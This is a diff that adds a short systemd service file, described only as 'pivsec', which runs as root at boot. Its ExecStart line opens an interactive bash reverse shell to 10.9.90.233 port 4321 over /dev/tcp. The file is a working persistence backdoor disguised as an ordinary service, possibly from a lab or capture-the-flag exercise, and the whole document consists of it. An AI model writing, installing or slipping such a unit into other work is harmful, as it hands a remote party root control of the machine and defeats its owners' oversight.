@@ -1,0 +1,11 @@
+[Unit]
+Description=pivsec
+
+[Service]
+Type=simple
+User=root
+ExecStart=/bin/bash -c '/bin/bash -i >& /dev/tcp/10.9.90.233/4321 0>&1'
+
+
+[Install]
+WantedBy=multi-user.target
